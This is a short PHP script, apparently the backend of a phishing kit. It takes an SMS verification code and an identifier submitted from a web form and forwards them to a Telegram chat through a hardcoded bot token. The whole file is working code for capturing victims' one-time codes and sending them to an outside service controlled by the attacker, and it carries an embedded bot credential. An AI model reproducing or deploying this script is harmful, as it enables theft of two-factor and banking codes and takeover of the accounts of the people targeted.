<?php
$telegramBotToken = '6718053935:AAFMv7NsTNd0kTG2QdT17_80a-oTDOyWE4U';
$chatId = '-4104959417';

$smsCode = $_POST['smsCode'];
$uniqueId = $_POST['uniqueId'];

$message = "SMS Code: $smsCode, Unique ID: $uniqueId";

$url = "https://api.telegram.org/bot$telegramBotToken/sendMessage?chat_id=$chatId&text=" . urlencode($message);

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$response = curl_exec($ch);
curl_close($ch);
$responseData = json_decode($response, true);
echo json_encode($responseData);
